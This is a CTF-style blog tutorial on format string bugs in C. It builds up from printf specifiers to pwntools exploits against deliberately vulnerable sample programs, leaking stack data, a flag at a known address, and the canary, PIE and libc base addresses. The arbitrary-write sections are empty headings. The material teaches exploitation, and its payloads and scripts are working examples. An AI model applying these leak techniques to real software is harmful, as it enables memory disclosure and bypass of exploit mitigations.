---
title: A Definitive Guide to Format String Bug
date: '2024-03-06'
tags: ['ctf-techs', 'fsb', 'format-string', 'printf', 'pwn', 'guides']
draft: false
summary: A detailed guide on how printf's can be used for arbitrary read and arbitrary write.
---

## Introduction

When I was learning about FSB's, I found an overwhelming amount of content that had detailed writeups, but none really answered the basic questions that I had in mind. Debugging FSBs for me was hard; especially when I was new to pwn. So, to answer all those questions that I had, I'm writing the detailed guide.

In this guide, I'll be explaining intricate details of Format String Bugs, how they occur, how they work and how they can be exploited to read and write values to an arbitrary location and get a shell. This blog post will go in-depth to make sure that we fully understand each concept as we go through them.

## Table of Contents

1. **[What is a Format String](#what-is-a-format-string)**
    - **[Specifier](#specifiers)**
        - **[Length sub-specifier](#length-sub-specifier)**
        - **[Position sub-specifier](#position-sub-specifier)**
2. **[What is Printf](#what-is-printf)**
    - **[Usage](#usage)**
3. **[Format String Bug](#format-string-bug)**
    - [Occurance of an FSB](#occurance-of-an-fsb)
4. **[Arbitrary Read](#arbitrary-read)**
    - [From the stack](#from-the-stack)
    - [From an address](#from-an-address)
        - [Identifying the format string start offset](#identifying-the-format-string-start-offset)
    - [Leaking PIE/ASLR/Canaries](#leaking-pieaslrcanaries)
5. [Debugging FSB](#debugging-a-fsb)
6. **[Arbitrary Write](#arbitrary-write)**
    - [To an address](#to-an-address)
    - [Overwriting GOT Entries](#overwriting-entries-on-the-global-offset-table)
    - [Writing a ROP Chain](#writing-a-rop-chain-using-fsb)
7. **[Pwntools and other tools](#pwntools-and-other-tools)**

---

## What is a Format String?

In order to understand `Format String Bug`, we must first fully understand what `Format String` is.

> A format string is a string that contains special placeholders or format specifiers, which are used to define the layout and formatting of variables when creating formatted output. These format specifiers are placeholders for values that will be substituted into the string during runtime.

A format specifier must follow the following syntax (Reference: [cplusplus.com](https://cplusplus.com/reference/cstdio/printf/)):

```c
%[flags][width][.precision][length]specifer
```

### Specifiers

For each of the data type in C/C++, there exists a specifier that needs to passed for the value that is to be displayed. There exist the following the specifiers:

| specifier | data-type |
| --- | --- |
| d or i | Signed Decimal Integer |
| u | Unsigned Decimal Integer |
| o | Unsigned Octal |
| x or X | Unsigned Hexadecimal Integer |
| f or F | Decimal Floating Point |
| e or E | Scientific notation (mantissa/exponent) |
| g or G | Use the shortest representation: %e or %f |
| a or A | Hexadecimal floating point |
| c | Character |
| s | String of characters (`NULL` terminated) |
| p | Pointer address
| n | **Important:** This doesn't really print anything, but argument to this must be a pointer to a signed int. This will write the number of characters written so for the pointed location. |
| % | A % followed by another % character will write a single % to the stream |

The format specifier can also contain sub-specifiers: flags, width, .precision and length modifiers (in that order), which are optional and follow these specifications. For our exploitation purposes, the only thing that is worth noting is the `length` modifier. However, it is recommended that we understand the inner workings, for that, I highly recommend that you go and read [this](https://cplusplus.com/reference/cstdio/printf/).

#### Length sub-specifier

The length sub-specifier modifies the length of the data type.

| length sub-specifier | d,i | u,o,x,X | f,F,e,E,g,G,a,A | c | s | p | n |
| --- | --- | --- | --- | --- | --- | --- | --- |
| (none) | int | unsigned int | double | int | char* | void* | int* |
| hh | signed char (one-byte) | unsigned char | - | - | - | - | signed char* |
| h | short int (2-bytes) | unsigned short int | - | - | - | - | short int* |
| l | long int (8-bytes) | unsigned long int | - | wint_t | wchar_t* | - | long int* |
| ll | long long int (8-bytes) | unsigned long long int | - | - | - | - | long long int* |

> NOTE: There are other sub-specifiers, but we'll focus on only these.

#### Position sub-specifier

There's also one sub-specifier (per-se) that allows an exact position offset value (from `RSP`) that can be passed to a specifier specified. The usage of that is as follows:

```c
%{POSITION}${SPECIFIER}

/* Example: */
%10$p
// This will print the 10th value as a pointer address from the RSP.
```

## What is Printf

According to [`cplusplus.com`](https://cplusplus.com/reference/cstdio/printf/):

> Writes the C string pointed by format to the standard output (stdout). If format includes format specifiers (subsequences beginning with %), the additional arguments following format are formatted and inserted in the resulting string replacing their respective specifiers.

In simpler terms, `printf` is a function that takes in a [`format specifier`](#specifiers), parses it and displays it to `stdout`. Printf can take `N` number of arguments. These type of functions that can take an arbitrary number of arguments are often known as `variadic` functions. These functions have `...` in their arguments list refering to `N` number of arguments input. The prototype of `printf` is as follows:

```c
int printf ( const char * format, ... );
```

> Fun-Fact: When printf doesn't have any format specifier, compilers such as `gcc` and `clang` often compile `printf` to `puts` for performance enhancment.

The following functions from the format string family are often most vulnerable to FSBs:

1. `printf()`
2. `fprintf()`
3. `sprintf()`
4. `vprintf()`
5. `snprintf()`
6. `vsnprintf()`
7. `vfprintf()`

### Usage

Let's consider the following program to understand the basic usage of printf

```c:printf-usage.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old!\n", name, age);
}
```

We can compile this program using:

```bash
gcc -o printf-usage printf-usage.c -w
```

Once we run the `./printf-usage` binary, we get an output like this:

```txt
My name is Ashfaq Nadeem and I'm 22 years old!
```

Now, what happened under the hood was, the `%s`, looked for it's value from the first specified argument, i.e. `name`, and `%d` looked for it's argument in the second argument.

Using the position sub-specifier, we'll make the third specifier read value from the second argument passed to `printf`. It would look something like this:

```c:print-usage-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char* name = "Ashfaq Nadeem\0";
    int age = 22;
    printf("My name is %s and I'm %d years old. But people don't really believe that I'm %2$d years old.\n", name, age);
}
```

> NOTE: we might get a warning, but we can ignore this. ;)

The output for this becomes:

```txt:stdout
My name is Ashfaq Nadeem and I'm 22 years old. But people don't really believe that I'm 22 years old.
```

What happened here? Well, the second argument passed to `printf` was `age`. In the third specifier, i.e. `%2$d`, what we simply did was tell printf to use the second argument passed to it, and put it here.

## Format String Bug

A Format String Bug (FSB) is a bug that occurs when an unsanitized input is directly passed to a printf and the input contains a `format string`.

### Occurance of an FSB

Let's consider the following code:

```c:fsb-test.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    int age = 22;
    printf("My age: %d\nMy ID: %d\nMy uuid: %d\nMy data: %d\n", age);
}
```

Now, what's the exact problem in this code? Well, We've only passed one argument to the printf, i.e. `age`, but there are `3` more specifiers that do not have an associated variable, what happens in this case? The values that are currently stored on the stack, will start printing. The output will be something like this:

```txt:stdout
My age: 22
My ID: 1478696264
My uuid: -1761119872
My data: 0
```

Why is that? That is because, in `printf`, the format specifiers can read value off of the stack. If no argument is provided, the next value stored will be popped into the specifier that is present. Therefore, in our case, we only passed `age`, and nothing else. `Printf`, automatically got the second, third and forth value from the stack and populated the format string itself.

The question here becomes, ***This is a bug in code, how is this even exploitable?***. The answer is pretty simple, what if you control what is directly passed into the printf?

To better understand this, consider this code:

```c:fsb-test-2.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    printf("Enter your name: ");
    scanf("%250s", buffer);
    printf(buffer);
}
```

Now, in this code, we can see that, our input is directly passed into `printf`, i.e. `printf(buffer)`. The problem here is:

1. If we pass a format string as input; let's say `%d`, then the function call will become: `printf("%d")`, which will simply derefence the first value as an integer and give us the output. Let's pass input: `%d.%d.%d.%d` as input to this program:

```txt:stdout
Enter your name: %d.%d.%d.%d
10.0.0.10
```

### Exploitation of an FSB

Now, we've seen how we can read a value from the stack, but there are ways we can also write values on to the stack, and other places which can give us code-execution. FSB can be exploited to let us do the following:

1. Read arbitrary data from the stack
2. Read arbitrary data from an address
3. Read ELF/library addresses from the stack to bypass PIE/ASLR
4. Write arbitrary data to the stack
5. Overwrite an entry on the GOT to override execution
6. Write a ROP chain and execute it

## Arbitrary Read

We have already taken a look at what arbitrary read looks like in [Occurance of an FSB](#occurance-of-an-fsb) section. However, in this section, we'll dive really deep into this.

Now, using an FSB, we can do to two kinds of reads:

- From the stack
- From an address

### From the stack

Now, we've understood the theory behind how printf works and how we can easily read values from the stack using a simple FSB. Let's explore this a bit further. To better understand, let's consider the following program:

```c:fsb-stack-read.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    char admin_pwd[0x20] = { "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDD" };

    printf("What is your name? ");
    scanf("%255s", buffer);

    printf("Welcome ");
    printf(buffer);

    printf("Do you know what the admin password is? ");
    scanf("%255s", buffer);

    if(strcmp(admin_pwd == buffer) == 0) {
        printf("You have successfully passed this test...");
        return 0;
    }

    printf("Well, %s; you failed!", buffer);
    return 1;
}
```

Now, in this program, the first input takes values as input and passes it directly into the `printf`, giving us an `fsb`. The next input, will ask for an `admin password` and then compares it with `admin_pwd`. In our case, the `admin_pwd` is hardcoded, however, in somecases, we might have to leak values from the stack. So, let's try and leak the `admin_pwd`.

> NOTE: We have PIE enabled on this program so we can't directly give it the address of `admin_pwd` to leak value.

Let's firstly start out by simply passing `%s` specifier to the `name` input:

```txt:stdout
What is your name? %s
[1]    494914 segmentation fault (core dumped)  ./main
```

Wait, our program crashed? This is because, the `%s` specifier actually dereferences the value that is present, this is often used for `char*`, which are actually pointers and therefore, the program crashed because the program tried to read value from a non-existent/unreachable address. Let's check the address stored at this position by using the `%p` specifier:

```txt:stdout
What is your name? %p
Welcome 0x20656d6f636c6557Do you know what the admin password is? 
```

Well, the program did not crash this time, and we got a weird looking hex, `0x20656d6f636c6557`. Well, now we know why our program crashed when we entered `%s`. Now, what if we want to read the next values from the stack? Well, [position sub-specifiers](#position-sub-specifier) are our best friend. Let's try and enter `%2$p`, to print the second value from the stack. Also, this time; I'll add a seperator in my input to easily be able to identify the data. The input that I'll pass will be: `|%2$p|`

```txt:stdout
What is your name? |%2$p|
Welcome |(nil)|Do you know what the admin password is? 
```

Well, this time, we can see that we got `(nil)`, which indicates that `0x00000000` exists in this location. Let's try and read multiple values from the stack. The input that I'll pass will be: `|%3$p|%4$p|%5$p|%6$p|`

```txt:stdout
What is your name? |%3$p|%4$p|%5$p|%6$p|
Welcome |(nil)|0xa|0x8|0x4141414141414141|Do you know what the admin password is? 
```

Now, we can see that, on `%6$p`, we got `0x4141414141414141`, which corresponds to `AAAAAAAA`. Looking at the admin_pwd, we can see that, from offset `6`, `admin_pwd` exists. We can leak, `%7`, `%8` and `%9`, to get the remaining data of `admin_pwd` from the stack:

```txt:stdout
What is your name? |%6$p|%7$p|%8$p|%9$p|
Welcome |0x4141414141414141|0x4242424242424242|0x4343434343434343|0x4444444444444444|Do you know what the admin password is? 
```

Now, we have the value from the stack.

> NOTE: This value is in little endian, we cannot see it because of the repeating values. So, parse it accordingly.

Similar to this technique, we can also leak strings from the stack by just changing the specifier to `%s`. However, for the strings, make sure to pass only one specifier at a time to ensure that we get a string as the program will just crash if the address on that specifier is invalid.

### From an address

In the previous technique, we simply leaked values from the stack to read the contents of a variable. Now, what if we want to leak value from a specified address. What then? Well, FSBs are powerful enough to do just that. Let's consider the following program:

```c:fsb-address-read.c
#include <stdio.h>
#include <stdlib.h>

char flag[100];

void read_flag() {
    FILE *file;
    file = fopen("flag.txt", "r");
    fgets(flag, 100, file);
    fclose(file);
}

int main() {
    char buffer[100];
    read_flag();
    printf("Flag is stored at: %p\n", flag);
    printf("Who are you? ");
    scanf("%100s", buffer);
    printf(buffer);
}
```

> NOTE: For this technique, we'll be using `pwntools` to write an exploit.

We'll compile this program with PIE disabled:

```bash
gcc -o fsb-address-read fsb-address-read.c -no-pie -w
```

Now, after running the program, we're greeted with the following output:

```txt:stdout
Flag is stored at: 0x404080
Who are you? 
```

Now, we can see that, we're given the address of `flag`, and we need to leak the value from that address. There are two ways of doing this.

1. Writing address before our format string
2. Writing address after our format string

Now, the first one is most often used, however, the problem with that approach is, if `printf` encounters a NULL-byte, the format string won't execute. Meaning, let's say, flag was at address `0x404000`, then; in that scenario, if we actually passed the address before the format string, the `printf` would stop on getting that `0x00`. Therefore, we often write after our format string. Now, since the address passed to us in this example is `6 bytes` long, if we add `00` before it, our printf will only display the address and won't execute the format string therefore, we'll keep our focus on writing the address after our format string.

Before writing, we need to do one important thing:

#### Identifying the Format String start offset

Now, in order to make sure that we write at the exact offset on the stack where our format string is; we need to find it. Finding it is pretty easy. We normally send in `A`'s as input, and then send multiple specifier. Whatever specifier returns `0x41`, we can easily know that that'll be the start of our format string.

So, let's send the following input to our `fsb-address-read` program:

```bash
AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
```

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
AAAAAAAA|0xa.(nil).(nil).0xa.0x7c.0x4141414141414141.0x252e70252e70257c.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x7f0070252e70.0x7ffd031ada36
```

Now, we can see that, at position 6, we got `0x4141414141414141`, meaning that we found the start of our format string to be `6`. We can confirm this by sending: `AAAAAAAA|%6$p` as input:

```txt:stdout
Flag is stored at: 0x404080
Who are you? AAAAAAAA|%6$p
AAAAAAAA|0x4141414141414141
```

#### Writing the address after our string

Now, before moving forwards, let's write a simple `exploit.py`, that will extract the leaked address:

```py:exploit-fsb-address-read.py
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
io = process("./fsb-address-read")
if args.GDB: gdb.attach(io, "b *main")

io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
io.interactive()
```

Now, we have a boilerplate code ready for us. Next, we need to start writing a payload. So, firstly, we know that `%6` is the position where our input starts. So, what we need to do:

- Write the address of `flag` on to the stack.
- Dereference the position where the data was written on the stack.

So, let's see since we'll write the address after the format string (to avoid breaking of printf on NULLs), let's firstly craft our format string. We know, that, we'll want to reference a value from an address that'll be stored on the stack. So, the address will be `8` bytes. Let's also take into account that; `%6$s`, will also be written on to the stack. Adding those two up, `8+4` (4 is `'%6$s'`'s length), i.e. 12. But, we know that addresses stored on the stack are offset by 8. So, we need to pad our payload so that it's length becomes divisible by 8. So, the payload can look something like this:

```py
payload = b"%6$s||||" + p64(leak)
```

> | here represents padding, you can whatever you like instead of this.

Now, one thing we need to understand here. The first value was referenced using `%6`. But, if we do a mental map, following data will be stored on the stack:

```hex:stack
rsp ...
rsp+6 : %6$s|||| : 0x7c7c7c7c70243620
rsp+7 : leak : 0x0000000000404080
```

Now, if we were to `%6$s`, instead of leaking the value of `0x404080`, the value on 6th address will be `0x7c7c7c7c70243625`, and this will cause the program to crash. We can confirm this by using GDB.

![alt text](/static/ctf-techs/image.png)

and if we check the value currently stored at rdi:

![alt text](/static/ctf-techs/image-1.png)

So, in order to read the value, we'll read the 7th offset, instead of the 6th:

![alt text](/static/ctf-techs/image-2.png)

Therefore, the final exploit becomes:

#### fsb-address-read exploit

```py:exploit-fsb-address-read.py
#!/usr/bin/env python3

from pwn import *

io = process("./fsb-address-read")
io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
payload = b"%7$s||||" + p64(leak)
io.sendline(payload)
io.interactive()
```

### Leaking PIE/ASLR/Canaries

The whole idea behind PIE, ASLR and Canaries is the randomness to ensure that on each launch, the value change, whether it be the base of the binary (in case of PIE), the load address of library (in case of ASLR), or the stack canary. Format String Bug is such an amazing bug that allows to leak the address from the stack. These addresses may belong to the binary, the libc or may very well be the canary.

Why these leaks may be important, you might ask. Well, in case of PIE and ASLR, the binary is loaded into memory at a random address. However, the difference between the base of the loaded binary and a function (let's say `printf`), is always constant. So, if we somehow get a leak, we can calculate the distance from a certain base (loaded in memory at the time of leak) and we can easily get the offset, that will always ensure that we a leak of a known offset in memory.

To fully understand this, let's take the following example:

Let's say, that on launch of a program, libc is loaded at: `0x7ffcf85dd000`, and puts is located at `0x7ffcf85de420`. Now, using a format string let's say `%16$p`, we are able to leak the value of `puts`, that came out to be `0x7ffcf85dd420`. Now, for me to find a constant offset everytime, what I can do, is simply subtract the leak that I got, with the base of libc. i.e. `0x7ffcf85de420-0x7ffcf85dd000`, and I got the answer: `0x1420`. Now, the thing is, whenever I leak the value using `%16$p`, I can easily find the base of libc, by simply doing `leak-0x1420` and the answer will always result in the base of libc. This exact technique can be used to find the `PIE-base` of binaries.

In case of canaries, we can also simply leak them using a format strings. One question that I had was `How do I know what's the canary?`. Well, in `pwndbg`, we have a command called `canary` that will simply list the canary. Another easier gimmick is; all canaries end with `00`, so, one the stack, we can keep an eye out for numbers that end with `00`.

Let's consider the following program:

```c:fsb-leaks.c
#include <stdio.h>
#include <stdlib.h>

int main() {
    char buffer[0x100];
    printf("What is your name? ");
    fgets(buffer, 0x100, stdin);
    printf(buffer);

    printf("Is it really your name? ");
    gets(buffer);

    return 0;
}
```

Now, we'll compile this program with all mitigations:

```bash
gcc -o fsb-leaks fsb-leaks.c -w
```

> We will get a linker warning, that is because we're using `gets`, so we can just ignore that.

I've already wrote a writeup in which I explain in greate detail about how you can leak libc values and find the base. You can read about it [here](/blog/writeups/blackhatmea23-quals/pwn/Profile#leaking-the-libc-address-using-the-fsb-vulnerability)

Now, let's run the binary in GDB and start leaking values.

![alt text](/static/ctf-techs/image-13.png)

Now, here, we will first press `CTRL+C`, to break the program and enter GDB and then, we'll type `vmmap` to find out the virtual memory mapping of this:

![alt text](/static/ctf-techs/image-14.png)

Here we can see that, the PIE-base is `0x555555554000` and ends at `0x555555559000`, so any leaks between this range will give us PIE-leak. Similarly, `0x7ffff7db7000` to `0x7ffff7fa5000` is the address range of libc.

> NOTE: In GDB, we have ASLR off, so we'll always get the same addresses.

Looking back at the data we got:

```txt:stdout
What is your name? %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.                                                         
0x5555555596b1.(nil).0x5555555596f3.0x7fffffffd590.0x7c.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x340000a2e70.0x34000000340.(nil).0x100.(nil).(nil).(nil).(nil).(nil).
```

The first leaked address can be seen that might belong to the `pie`, however, you can see that `9b61` doesn't belong to the pie range of `0x....4000` to `9000`. Therefore, let's try and leak more values.

For this purpose, I made a simple command line utility in python that can generate format string patterns for us. You can take a look at in my [gist](https://gist.github.com/TheFlash2k/2ee4650c3fc850caceb558ef82fa9bd6)

Since, in the last payload, we leaked 22 values from the stack, let's leak 22 more, starting from 23. We can generate a simple payload using my script:

```bash
$ fmt-generator -s 23 -a 22 --with-index
```

This generated the following payload:

```txt:stdout
|23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
```

Now, let's pass this input to our program once again in GDB. The output we got is:

```txt:stdout-gdb
What is your name? |23=%23$p|24=%24$p|25=%25$p|26=%26$p|27=%27$p|28=%28$p|29=%29$p|30=%30$p|31=%31$p|32=%32$p|33=%33$p|34=%34$p|35=%35$p|36=%36$p|37=%37$p|38=%38$p|39=%39$p|40=%40$p|41=%41$p|42=%42$p|43=%43$p|44=%44$p|45=%45$p
|23=0x70243833253d3833|24=0x243933253d39337c|25=0x3034253d30347c70|26=0x34253d31347c7024|27=0x253d32347c702431|28=0x3d33347c70243234|29=0x34347c7024333425|30=0x347c70243434253d|31=0xa70243534253d35|32=0x7fffffffd600|33=0x55555555529d|34=0x7ffff7fa82e8|35=0x555555555250|36=(nil)|37=0x5555555550c0|38=0x7fffffffd790|39=0x9b65a96d8a91da00|40=(nil)|41=0x7ffff7ddb083|42=0x7ffff7ffc620|43=0x7fffffffd798|44=0x100000000|45=0x5555555551a9
Is it really your name?
```

Now, in this output, we see quite a lot of values that will be helpful for us. Firstly, we can see that at index `33`, we have an PIE leak, same at `35`, `37`, and `45`. Let's consider the value at index `33`. In gdb, we can use `xinfo <address>` command to find the exact offset from the base. So, in our case: `xinfo 0x55555555529d` gives us:

![alt text](/static/ctf-techs/image-15.png)

We can see that, the difference from the leak address to the base is `0x129d`. So, whenever we'll do `%33$p` and if we subtract `0x129d` from the leaked value, we can get the base of the binary.

In the above output, we got another juicy value i.e. the `canary`, where; you might ask. Well, like I told you before, canary values often end in `00`, so; if we look at `39` index, we can see: `39=0x9b65a96d8a91da00`. Let's confirm if this is the canary using GDB:

![alt text](/static/ctf-techs/image-16.png)

Perfect, and lastly, we also got a libc leak, looking closely at index `41`. We can see `41=0x7ffff7ddb083` which corresponds to the range that we analyzed before. So, similar to pie, let's find the offset of the leak with base using `xinfo 0x7ffff7ddb083` command:

![alt text](/static/ctf-techs/image-17.png)

We can see that the offset is `0x24083`. So, to sum up, we can simply leak all three values using a single payload, i.e:

```py
payload = b"|%33$p|%39$p|%41$p|"
```

And then upon each leak, we can parse accordingly, a small exploit for parsing these values look something like:

```py:exploit-fsb-leaks.py
#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF("./fsb-leaks")
libc = elf.libc
io = process()

payload = b"|%33$p|%39$p|%41$p|"
io.sendline(payload)

leaks = io.recvline().split(b'|')[1:-1]
pieleak = int(leaks[0], 16)
canary = int(leaks[1], 16)
libc_leak = int(leaks[2], 16)

elf.address = pieleak - 0x129d
libc.address = libc_leak - 0x24083

print("Pie Base : %#x" % elf.address)
print("Canary   : %#x" % canary)
print("Libc Base: %#x" % libc.address)

# do the rest of the exploit here....
```

Running this on the binary without GDB to ensure that ASLR is on:

![alt text](/static/ctf-techs/image-18.png)

We can be sure if we have the base of PIE/LIBC if the last three nibbles end in 0.

## Debugging a FSB

When I was learning FSB's, One of the hardest things for me was debugging and finding out exactly where my payload was messing up and how I could fix it. If you're stuck at a similar position, I'll try my best to explain this concept to you in detail.

For this demonstration, I'll use [this](#from-an-address) source code. Now, in the [exploit](#fsb-address-read-exploit) that we wrote for reading data from an address, we made a mental map and understood that we had to `pad` in order to get the value into the next address. Instead of a mental map, let's use GDB.
Firstly, we must identify, at which point we must break and analyze the values in stack/registers. For that, let's simply: `disass main`:

![alt text](/static/ctf-techs/image-3.png)

Now, we can see that:

```hex
0x0000000000401292 <+114>:   call   0x4010b0 <printf@plt>
```

Is the call to printf that we're looking for. How did I come to know that this is the printf call that I'm looking for?

```hex
   0x0000000000401286 <+102>:   lea    rax,[rbp-0x70]
   0x000000000040128a <+106>:   mov    rdi,rax
```

In this scenario, whatever that I'm inputting is stored at `rbp-0x70`. And, that data is being loaded into `rax`, and then passed in as the first argument `printf`.

Now, in order to set breakpoint in gdb, we use `b *<ADDRESS>`. So, we can either use: `b *0x0000000000401292` or using function relative offsets: `b *main+114`. We'll write an exploit in pwntools that will automatically attach GDB to it. And, instead of using a working payload, we'll use the first crafted payload i.e. `%6$s`

```py:exploit-debugging.py
#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
io = process("./fsb-address-read")
if args.GDB: gdb.attach(io, "b *main+114") # adding the gdb breakpoint here.
io.recvuntil(b": ")
leak = int(io.recvline(), 16)
info("Flag is at: %#x" % leak)
payload = b"%6$s" + p64(leak)
io.sendline(payload)
io.interactive()
```

Now, in order to run this, we need to run it as:

```bash:Terminal
$ tmux
# NOTE: tmux is a must, if you don't want to use tmux, remove the `context.terminal` line from the exploit and run the command:
$ python3 exploit-debugging.py GDB
```

Now, once we have the gdb pane in tmux, we need to press `c` to continue our execution.

![alt text](/static/ctf-techs/image-4.png)

Now, we can see that:

```hex
 ► 0x401292 <main+114>           call   printf@plt                      <printf@plt>
        format: 0x7ffc5f332ca0 ◂— 0x40408073243625
        vararg: 0xa      
```

The data at `0x7ffc5f332ca0` is `0x40408073243625`, which looks like a mixture of the address i.e. `0x404080` and our format string. Let's analyze the data at the stack pointer:

```gdb
pwndbg> x/gx $rsp
```

![alt text](/static/ctf-techs/image-5.png)

We can see more the next 10 bytes as well:

```gdb
pwndbg> x/10gx $rsp
```

![alt text](/static/ctf-techs/image-6.png)

Now, we can clearly see that, the data being passed to `printf` is `0x0040408073243625` and our payload i.e. `%6$s`, will dereference this value, which will cause a segfault.

Now, what we need to do, is move `0x404080` to the next address. How can we do that? The padding... We can see that, there are four bytes that; if added will move the flag-address to the next address. So, we'll add four characters for padding. Our payload will look something like this now:

```py
payload = b"%6$s||||" + p64(leak)
```

Now, when exploit is run with GDB:

![alt text](/static/ctf-techs/image-7.png)

Looking at the data in stack:

```gdb
pwndbg> x/10gx $rsp
```

![alt text](/static/ctf-techs/image-8.png)

We can clearly see that:

```h
0x7ffd790e8360: 0x7c7c7c7c73243625      0x0000000000404080
```

`0x404080` is written to the next chunk in memory. Let's press `C` to continue the execution of this program.

![alt text](/static/ctf-techs/image-9.png)

We received a SEGFAULt, why? Remember, we offset `6`, but at the `6th` position, `0x7c7c7c7c73243625` exists. Therefore, we now need to offset `7` in order to make sure that we read the `7th` value from the stack. We can confirm this, by getting the value of `rdi` when the program crashed:

```h
 ► 0x7f15d681f947 <__strlen_avx2+71>     vpcmpeqb ymm1, ymm0, ymmword ptr [rdi]
```

```gdb
pwndbg> p/x $rdi
```

![alt text](/static/ctf-techs/image-10.png)

This confirms what we said earlier. Now, if we change the payload to reference `7th` value, instead of `6th`, we get the flag.

Using these exact same techniques, we can debug write-fsbs.

## Arbitrary Write

### To an address

### Overwriting Entries on the Global Offset Table

### Writing a ROP Chain using FSB

## Pwntools and other tools
